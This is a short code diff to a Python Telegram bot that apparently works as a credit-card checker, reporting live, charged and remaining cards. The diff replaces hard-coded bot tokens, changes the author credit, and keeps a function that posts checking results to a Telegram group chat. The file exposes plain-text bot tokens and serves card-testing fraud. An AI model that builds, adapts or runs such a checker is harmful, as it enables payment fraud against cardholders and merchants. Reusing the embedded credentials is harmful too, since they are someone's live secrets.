@@ -14,7 +14,7 @@ import string
 import logging
 import re
         
-token = "7893259724:AAFfxQ5TuhiHtv9hr6QGBg524d0p-vaFGaI" 
+token = "7959620740:AAFAHbQYPrW2KXmzwog4lMiv0XQUVgJ0aEM" 
 bot=telebot.TeleBot(token,parse_mode="HTML")
 
 owners = ["7736734364"]
@@ -319,7 +319,7 @@ def main(message):
 𝗧𝗶𝗺𝗲: 0 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
 𝗟𝗲𝗳𝘁 𝘁𝗼 𝗖𝗵𝗲𝗰𝗸: {total - dd - live - ch}
 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @{username}
-𝐁𝐨𝐭 𝐁𝐲:  @god_forever'''
+𝐁𝐨𝐭 𝐁𝐲:  @ghostxdy'''
 				print(last)
 				if "requires_action" in last:
 					send_telegram_notification(msg)
@@ -591,7 +591,7 @@ def chk(message):
     
     
 def send_telegram_notification(msg1):
-    url = f"https://api.telegram.org/bot7893259724:AAFfxQ5TuhiHtv9hr6QGBg524d0p-vaFGaI/sendMessage"
+    url = f"https://api.telegram.org/bot7959620740:AAFAHbQYPrW2KXmzwog4lMiv0XQUVgJ0aEM/sendMessage"
     data = {'chat_id': -4863319353, 'text': msg1, 'parse_mode': 'HTML'}
     requests.post(url, data=data)
     
